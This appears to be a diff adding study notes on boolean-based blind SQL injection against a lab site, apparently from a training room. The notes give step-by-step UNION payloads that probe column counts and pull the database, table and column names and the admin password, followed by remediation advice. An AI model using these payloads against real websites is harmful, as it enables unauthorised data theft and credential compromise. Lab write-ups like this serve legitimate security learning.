@@ -97,6 +97,151 @@ SELECT * from blog where id=1 and private=0 LIMIT 1;
 
 
 
+Boolean-based SQL Injection to extract info from the database one piece at a time using true/false results (based on whether {"taken": true} is returned).
+
+You’re on a site that checks if a username is already taken:
+
+    https://website.thm/checkuser?username=admin
+
+    If the name exists, it returns:
+    {"taken": true}
+    If not, it returns:
+    {"taken": false}
+
+This means true/false responses show us if our injection works.
+
+
+✅ Step 1: Find how many columns are in the SQL query
+
+We try UNION SELECT with increasing numbers of values until it works:
+
+Try:
+
+admin123' UNION SELECT 1;--
+
+→ false
+
+Try:
+
+admin123' UNION SELECT 1,2;--
+
+→ false
+
+Try:
+
+admin123' UNION SELECT 1,2,3;--
+
+→ true ✅
+➡️ So: 3 columns
+
+
+
+
+🧠 Step 2: Find the database name
+
+Use this:
+
+admin123' UNION SELECT 1,2,3 WHERE database() like '%';--
+
+→ true (matches anything)
+
+Try letters:
+
+admin123' UNION SELECT 1,2,3 WHERE database() like 's%';--
+
+→ true ✅
+Try more letters (like sq%, sql%, etc) until you discover:
+
+sqli_three
+
+
+
+
+🗂️ Step 3: Find the table name
+
+Now you check what tables exist in the database sqli_three:
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
+WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+
+→ true ✅
+Eventually you find the table:
+
+users
+
+
+
+📋 Step 4: Find the column names in the users table
+
+Same idea, different table:
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.columns 
+WHERE table_schema='sqli_three' and table_name='users' 
+and column_name like 'u%';--
+
+Repeat with different letters and exclude ones you've already found using:
+
+... and column_name != 'id'
+
+Eventually, you'll find:
+
+id, username, password
+
+
+
+
+🔐 Step 5: Find the actual data
+
+Now you're ready to look inside the users table!
+✅ Find a username:
+
+admin123' UNION SELECT 1,2,3 FROM users WHERE username like 'a%;--
+
+→ keep guessing letters until you find:
+
+admin
+
+🔑 Find the password:
+
+admin123' UNION SELECT 1,2,3 FROM users 
+WHERE username='admin' and password like '3%';--
+
+
+
+
+
+
+
+Tools That Automate Boolean-based SQL Injection:
+🔹 sqlmap
+
+
+
+
+
+
+Remediation
+
+As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:
+
+
+Prepared Statements (With Parameterized Queries):
+
+In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. 
+Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.
+
+
+Input Validation:
+
+Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, 
+or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 
+
+
+Escaping User Input:
+
+Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. 
+Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.
+
 
 
 
